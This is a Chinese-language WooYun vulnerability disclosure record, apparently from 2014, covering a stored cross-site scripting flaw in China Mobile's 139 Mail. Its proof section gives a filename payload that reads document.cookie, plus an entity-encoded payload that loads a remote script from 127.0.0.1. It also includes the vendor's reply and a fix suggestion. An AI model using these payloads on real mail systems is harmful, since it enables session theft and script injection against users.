{"id": 4589, "wybug_id": "wooyun-2014-053394", "wybug_title": "139邮箱存储型跨站可加载本地恶意脚本", "wybug_corp": "中国移动139邮箱", "wybug_author": "dilcon", "wybug_date": "2014-03-12 10:59", "wybug_open_date": "2014-04-26 11:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向公众公开  简要描述： 139邮箱对邮件内容过滤不严格，导致可以加载本地服务器脚本，执行任意javascript代码。 详细说明：  139邮箱处理附件名字段时，遗漏对特殊字符的有效过滤，导致可以截断标签属性值，插入恶意事件并执行任意javascript代码   漏洞证明：  1、发送邮件到139邮箱，邮件附件名改为：hlespayload.jpg' onmouseover=alert(document.cookie)  .jpg2、打开邮件，当收件人预览或下载附件时，漏洞触发,效果如下图：\n\n3、使用firebug查看源代码：\n\n4、修改onerror属性，加载本地服务器脚本：hlespayload.jpg' onmouseover=&#100&#61&#100&#111&#99&#117&#109&#101&#110&#116&#59&#101&#61&#100&#46&#99&#114&#101&#97&#116&#101&#69&#108&#101&#109&#101&#110&#116&#40&#39&#115&#99&#114&#105&#112&#116&#39&#41&#59&#101&#46&#115&#114&#99&#61&#39&#104&#116&#116&#112&#58&#47&#47&#49&#50&#55&#46&#48&#46&#48&#46&#49&#47&#105&#46&#106&#115&#39&#59&#100&#46&#98&#111&#100&#121&#46&#97&#112&#112&#101&#110&#100&#67&#104&#105&#108&#100&#40&#101&#41&#59 .jpg(由于邮箱对'/'进行了过滤，此处需要进行一下编码转换)。\n\n   修复方案：  对附件名字段的特殊字符进行严格过滤   版权声明：转载请注明来源 dilcon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-18 10:12 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT直接通报给中国移动集团公司。跨站在邮件系统是较为普遍且存在威胁的，根据触发条件，rank 10。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-12 11:42 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  我挖了几个月没挖出来    \n     2014-03-12 12:59 |    \t\t职业打酱油 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 人比较懒)\t\t \n  猫哥都关注了，不会是传说中的mxss吧，关注中 呵呵    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}